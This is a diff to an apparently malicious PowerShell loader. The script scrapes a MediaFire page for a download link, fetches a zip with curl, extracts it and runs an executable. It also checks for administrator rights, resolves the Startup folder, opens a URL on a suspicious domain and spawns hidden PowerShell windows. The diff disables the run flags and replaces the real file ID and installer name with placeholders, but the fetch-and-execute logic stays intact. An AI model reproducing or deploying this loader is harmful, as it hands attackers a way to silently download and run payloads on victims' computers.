@@ -111,7 +111,7 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$true;$p1=$true;$p2=$false;$p3=$false
+$runExe=$false;$p1=$false;$p2=$false;$p3=$false
 if(!($p1) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
@@ -123,13 +123,13 @@ $startmenuPath=[Environment]::GetFolderPath('Startup')
 }
 if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
 if($p1){
-$mediaFireUrl="https://www.mediafire.com:443/file/2jfibquocxikk8g/"
-$folderName="SetUp";$exeName="Setup.msi"
+$mediaFireUrl="https://www.mediafire.com:443/file/?/"
+$folderName="?";$exeName="?.exe"
 $zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
 $headers=@{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"}
 Write-Host "Getting MediaFire page..."
 try{
-$page=Invoke-WebRequest -Uri $mediaFireUrl -Headers $headers -UseBasicParsing -MaximumRedirection 10 -TimeoutSec 60 -ErrorAction Stop
+$page=Invoke-WebRequest -Uri $mediaFireUrl -Headers $headers -UseBasicParsing -MaximumRedirection 10 -TimeoutSec 30 -ErrorAction Stop
 }catch{throw "Could not access MediaFire page: $($_.Exception.Message)"}
 $directUrl=$null
 $directUrl=$page.Links|Where-Object{$_.href -and $_.href -match 'download.*mediafire\.com'}|Select-Object -ExpandProperty href -First 1
@@ -144,7 +144,7 @@ if(-not $directUrl){throw "Could not locate the MediaFire download URL."}
 Write-Host "`nDirect URL:`n$directUrl`n"
 if(Test-Path -LiteralPath $zipPath){Remove-Item -LiteralPath $zipPath -Force}
 Write-Host "Downloading to: $zipPath"
-$curlArgs=@("--location","--fail","--retry","3","--retry-delay","2","--connect-timeout","30","--max-time","600","-A","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","-o",$zipPath,$directUrl)
+$curlArgs=@("--location","--fail","--retry","3","--retry-delay","2","--connect-timeout","30","--max-time","300","-A","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","-o",$zipPath,$directUrl)
 & curl.exe @curlArgs
 if($LASTEXITCODE -ne 0){throw "curl download failed with exit code $LASTEXITCODE"}
 if(-not(Test-Path -LiteralPath $zipPath)){throw "Download failed: file was not created."}
@@ -186,7 +186,7 @@ break
 }
 '
 1..$count | ForEach-Object{
-Start-Process powershell.exe -WindowStyle Minimized -ArgumentList "-NoExit", "-Command", $command
+Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $command
 }
 }
 [Environment]::Exit(0)
